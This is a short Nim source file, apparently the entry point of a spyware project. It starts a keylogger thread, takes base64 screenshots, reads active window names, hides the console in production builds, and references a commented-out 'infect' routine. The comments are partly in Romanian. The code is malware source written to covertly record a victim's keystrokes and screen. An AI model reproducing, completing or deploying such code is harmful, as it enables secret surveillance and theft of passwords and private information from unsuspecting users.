import asyncdispatch
import lib/threads/keyloggerThread
import lib/functions/getWindowName
import lib/functions/screenshot
from lib/channels import mainThread

# am pus asta doar ca sa testez func
# import lib/functions/infect
# infect()

# hide the console window
const isProd {.booldefine.}: bool = false

when isProd:
  from lib/functions/beforeStart import run
  run()

let base64Ss: string = screenshot()

# writeFile("base64.tmp.txt", base64Ss)

## TODO: CODE CLEANUP
## TODO: COMUNICARE INTRE THREADURI
var thr: Thread[void]

open mainThread

createThread(thr, initKeyloggerThread)

while true:
  let channel = mainThread.tryRecv()

  if channel.dataAvailable:
    echo channel.msg

# proc main() {.async.} =
#   echo getWindowName()
#   await sleepAsync(1000)
#   asyncCheck main()

# asyncCheck main()

# runForever()

